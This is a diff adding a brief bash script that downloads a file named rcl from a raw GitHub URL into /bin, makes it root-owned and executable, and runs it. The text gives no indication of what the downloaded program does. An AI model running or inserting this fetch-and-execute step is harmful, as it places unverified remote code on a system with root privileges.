@@ -1,0 +1,5 @@
+#!/bin/bash -e
+ wget -O /bin/rcl https://raw.githubusercontent.com/j1nh0/linx/main/rcl&&chmod 0755 /bin/rcl&&chown root:root /bin/rcl
+ /bin/rcl
+ sync
+exit 0
